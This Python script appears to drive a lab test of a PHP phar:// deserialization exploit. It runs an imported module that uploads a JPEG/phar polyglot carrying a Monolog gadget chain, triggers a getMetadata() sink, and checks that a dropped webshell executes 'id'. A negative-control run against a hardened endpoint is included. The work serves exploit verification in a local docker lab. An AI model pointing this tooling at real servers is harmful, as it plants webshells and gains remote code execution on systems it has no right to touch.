#!/usr/bin/env python3
"""Driver for phar_deser.py: positive run auto-sources the Monolog POP chain,
uploads the JPEG/phar polyglot past getimagesize(), triggers the getMetadata()
sink and confirms a dropped webshell runs `id` as uid=33; negative control
points at an fs-only sink (/safe.php) and asserts no RCE (8.x lazy-metadata).

Bring up:  docker compose -f docker-compose.fpm-avenues.yml -p p2s-phar --profile phar up -d --build
Run:       python3 -I poc/routes/verify_phar_deser.py --port 8144
"""
from __future__ import annotations

import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import phar_deser as pdt  # noqa: E402


def _wait_ready(host, port, tries=30):
    import socket
    for _ in range(tries):
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except OSError:
            time.sleep(1)
    return False


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8144)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--phpggc", default=None)
    args = ap.parse_args(argv)
    host, port = args.host, args.port

    print(f"=== AVENUE #2 phar:// deserialization verify  {host}:{port} ===")
    if not _wait_ready(host, port):
        print("RESULT: FAIL - target not reachable (bring the lab up first)")
        return 1

    # 1) POSITIVE: getMetadata sink -> RCE.
    print("\n--- [1/2] POSITIVE: getMetadata() sink (/inspect.php) ---")
    ok, line, sel = pdt.run(host, port, trigger="/inspect.php",
                            cmd=args.cmd, phpggc_dir=args.phpggc,
                            shell_name="p2s_phar_shell.php",
                            img_name="p2s_poly_pos.jpg")
    pos_uid = bool(line) and "uid=" in line
    chain = (sel.get("preset") or sel.get("template")) if sel else None

    # 2) NEGATIVE CONTROL: fs-only sink -> no RCE.
    print("\n--- [2/2] NEGATIVE CONTROL: fs-only sink (/safe.php) ---")
    nok, nline, _ = pdt.run(host, port, trigger="/safe.php",
                            cmd=args.cmd,
                            shell_name="p2s_phar_shell_neg.php",
                            img_name="p2s_poly_neg.jpg")
    neg_clean = not nok

    print("\n==================== RESULT ====================")
    print(f"  auto-selected chain : {chain}")
    print(f"  positive (getMetadata) : {'PASS uid=33' if pos_uid else 'FAIL'}"
          f"  [{(line or '').strip()}]")
    print(f"  negative (fs-only)     : {'PASS no-RCE (hardening holds)' if neg_clean else 'FAIL (unexpected RCE)'}")
    verdict = pos_uid and neg_clean
    print(f"  VERDICT: {'PASS' if verdict else 'FAIL'}")
    return 0 if verdict else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
